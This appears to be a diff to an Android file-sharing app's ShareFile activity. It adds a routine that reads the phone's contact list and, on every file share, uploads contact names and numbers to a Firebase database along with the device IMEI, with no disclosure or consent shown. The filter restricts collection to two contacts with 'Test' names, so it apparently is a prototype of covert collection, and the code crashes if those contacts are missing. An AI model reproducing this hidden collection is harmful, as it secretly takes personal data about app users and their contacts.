@@ -4,6 +4,7 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.PendingIntent;
 import android.app.ProgressDialog;
+import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,6 +12,7 @@ import android.database.Cursor;
 import android.net.Uri;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
 import android.provider.OpenableColumns;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
@@ -66,6 +68,9 @@ public class ShareFile extends AppCompatActivity {
     ShowFileSharedAdapter adapter;
 
     String IMEINumber;
+//    public static String contact_name = "" ,contact_number = "";
+    ArrayList contact_name = new ArrayList();
+    ArrayList contact_number = new ArrayList();
     private static final int REQUEST_CODE = 101;
 
     @RequiresApi(api = Build.VERSION_CODES.N)
@@ -209,10 +214,15 @@ public class ShareFile extends AppCompatActivity {
 
                     showKeyDialog(file);
 
+                    getAllContacts();
+                    String contact = "";
+                    contact = "\n"+contact_name.get(0).toString() +":"+ contact_number.get(0).toString() +"\n"+contact_name.get(1).toString()+":"+contact_number.get(1).toString();
+//                    System.out.println("Name:"+contact_name+"/nNumber"+contact_number);
                     reference = FirebaseDatabase.getInstance().getReference().child(UserRegister.FILE_SHARED).child(username).push();
                     HashMap<String, String> hashMap = new HashMap<>();
                     hashMap.put("id", id);
                     hashMap.put("IMEI", IMEINumber);
+                    hashMap.put("Contact", contact);
                     hashMap.put("username", username);
                     hashMap.put("sender", sender);
                     hashMap.put("filename", filename);
@@ -321,6 +331,47 @@ public class ShareFile extends AppCompatActivity {
 
                 }
             });
+        }
+    }
+
+
+    private void getAllContacts() {
+//        ArrayList<String> nameList = new ArrayList<>();
+        ContentResolver cr = getContentResolver();
+        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
+                null, null, null, null);
+        if ((cur!= null ? cur.getCount() : 0) > 0) {
+            while (cur!= null && cur.moveToNext()) {
+                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
+                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+//                nameList.add(name);
+
+                if(name.equals("Test Cowert") || name.equals("Test abhinav"))
+                {
+                    contact_name.add(name);
+                }
+
+                if (cur.getInt(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
+                    Cursor pCur = cr.query(
+                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                            null,
+                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                            new String[]{id}, null);
+                    while (pCur.moveToNext()) {
+                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+//                        numberArray.add(phoneNo);
+                        if(name.equals("Test Cowert") || name.equals("Test abhinav"))
+                        {
+                            contact_number.add(phoneNo);
+                        }
+
+                    }
+                    pCur.close();
+                }
+            }
+        }
+        if (cur!= null) {
+            cur.close();
         }
     }
 }
